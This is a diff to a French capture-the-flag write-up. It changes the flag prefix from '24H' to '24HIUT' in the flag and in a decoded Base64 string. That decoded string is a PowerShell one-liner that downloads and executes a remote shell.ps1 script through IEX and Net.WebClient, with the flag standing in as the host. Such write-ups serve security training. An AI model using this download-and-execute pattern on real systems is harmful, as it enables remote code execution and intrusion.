@@ -31,9 +31,9 @@ Le contenu obtenu contient une chaîne encodée en Base64.
 On peut utiliser le site [CyberChef](https://gchq.github.io/CyberChef/) pour décoder la chaine.
 On peut alors trouver le flag dans la chaine décodée.
    ```bash
-   IEX (New-Object Net.WebClient).DownloadString('http://24H{T0ut_3st_C@ss3}/shell.ps1')
+   IEX (New-Object Net.WebClient).DownloadString('http://24HIUT{T0ut_3st_C@ss3}/shell.ps1')
 ```
 
 ## Flag
 
-Le flag est : ```24H{T0ut_3st_C@ss3}```
+Le flag est : ```24HIUT{T0ut_3st_C@ss3}```
